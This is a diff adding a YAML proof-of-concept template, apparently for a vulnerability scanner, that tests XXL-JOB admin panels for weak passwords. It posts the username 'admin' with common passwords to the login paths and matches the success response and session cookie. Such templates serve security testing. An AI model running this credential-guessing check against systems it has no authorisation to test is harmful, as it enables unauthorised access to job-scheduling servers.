@@ -1,0 +1,28 @@
+id: poc-yaml-xxl-job-weak-pass
+info:
+  name: XXL-JOB 后台管理系统弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: XXL-JOB
+  osprey-id: vb_2020_0080
+variables:
+  r_paths: '/xxl-job-admin/login
+
+    /login'
+  r_password: '123456
+
+    admin
+
+    admin123'
+requests:
+- method: POST
+  path: '{{.r_paths}}'
+  headers:
+    Content-type: application/x-www-form-urlencoded
+  data: userName=admin&password={{.r_password}}
+  expression: 'status_code == 200 && contains(body, "{\"code\":200,\"msg\":null,\"content\":null}")
+    && contains(headers, "Set-Cookie: XXL_JOB_LOGIN_IDENTITY")
+
+    '
+transport: http
